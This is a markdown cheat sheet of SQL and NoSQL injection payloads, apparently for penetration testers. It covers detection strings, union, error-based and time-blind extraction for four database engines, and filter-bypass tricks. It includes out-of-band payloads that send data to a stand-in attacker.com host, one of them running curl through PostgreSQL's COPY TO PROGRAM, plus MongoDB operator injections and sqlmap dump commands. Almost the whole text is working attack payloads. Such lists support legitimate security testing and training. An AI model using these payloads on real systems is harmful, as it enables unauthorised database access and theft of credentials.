# SQL Injection Patterns & Payloads

## Detection

### Basic Tests
```sql
'
"
`
')
")
`)
'))
"))
```

### Boolean-Based
```sql
1 OR 1=1
1' OR '1'='1
1" OR "1"="1
1' OR '1'='1'--
1' OR '1'='1'/*
1 AND 1=1
1 AND 1=2
```

### Error-Based
```sql
'
1'
1"
1`
1\
1')
1")
```

---

## Union-Based

### Column Count Detection
```sql
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
...
UNION SELECT NULL--
UNION SELECT NULL,NULL--
UNION SELECT NULL,NULL,NULL--
```

### Data Extraction
```sql
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

---

## Error-Based Extraction

### MySQL
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND updatexml(1,concat(0x7e,(SELECT version())),1)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### PostgreSQL
```sql
' AND 1=CAST((SELECT version()) AS INT)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--
```

### MSSQL
```sql
' AND 1=CONVERT(INT,(SELECT @@version))--
' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--
```

### Oracle
```sql
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

---

## Time-Based Blind

### MySQL
```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--
```

### PostgreSQL
```sql
'; SELECT pg_sleep(5)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

### MSSQL
```sql
'; WAITFOR DELAY '0:0:5'--
' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE 'a'+(SELECT 1 UNION SELECT 2 WHERE 1=0) END)='a'--
```

### Oracle
```sql
' AND DBMS_LOCK.SLEEP(5)--
' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM dual)--
```

---

## Out-of-Band (OOB)

### MySQL
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))--
```

### MSSQL
```sql
'; EXEC master..xp_dirtree '\\attacker.com\a'--
'; EXEC master..xp_fileexist '\\attacker.com\a'--
```

### Oracle
```sql
' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1))=1--
```

### PostgreSQL
```sql
'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/'--
```

---

## Bypass Techniques

### Comment Injection
```sql
SELECT/**/username/**/FROM/**/users
SEL/**/ECT username FR/**/OM users
```

### URL Encoding
```
' → %27
UNION → %55NION
SELECT → %53ELECT
```

### Case Variation
```sql
sElEcT * fRoM users
uNiOn SeLeCt NULL,NULL
```

### Whitespace Alternatives
```sql
SELECT%09username%09FROM%09users    -- tab
SELECT%0ausername%0aFROM%0ausers    -- newline
SELECT/**/username/**/FROM/**/users -- comment
SELECT+username+FROM+users          -- plus
```

### Keyword Alternatives
```sql
-- MySQL
UNION ALL SELECT
&&  (AND)
||  (OR)
%00 (null byte)
```

---

## Second-Order SQLi
```sql
-- Register with payload username
admin'--
-- Username stored in database
-- Later used in query without sanitization
```

---

## NoSQL Injection

### MongoDB
```javascript
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}}
{"$where": "sleep(5000)"}
```

### Query Operators
```javascript
$eq   - equal
$ne   - not equal  
$gt   - greater than
$lt   - less than
$gte  - greater than or equal
$regex - regex match
$where - JavaScript execution
```

---

## Database Fingerprinting

| Payload | MySQL | PostgreSQL | MSSQL | Oracle |
|---------|-------|------------|-------|--------|
| `SELECT @@version` | ✓ | ✗ | ✓ | ✗ |
| `SELECT version()` | ✓ | ✓ | ✗ | ✗ |
| `SELECT banner FROM v$version` | ✗ | ✗ | ✗ | ✓ |
| `String concatenation` | `CONCAT(a,b)` | `a\|\|b` | `a+b` | `a\|\|b` |

---

## Tools
```bash
# SQLMap
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# With request file
sqlmap -r request.txt --dbs
```

## References
- https://book.hacktricks.xyz/pentesting-web/sql-injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- https://portswigger.net/web-security/sql-injection/cheat-sheet
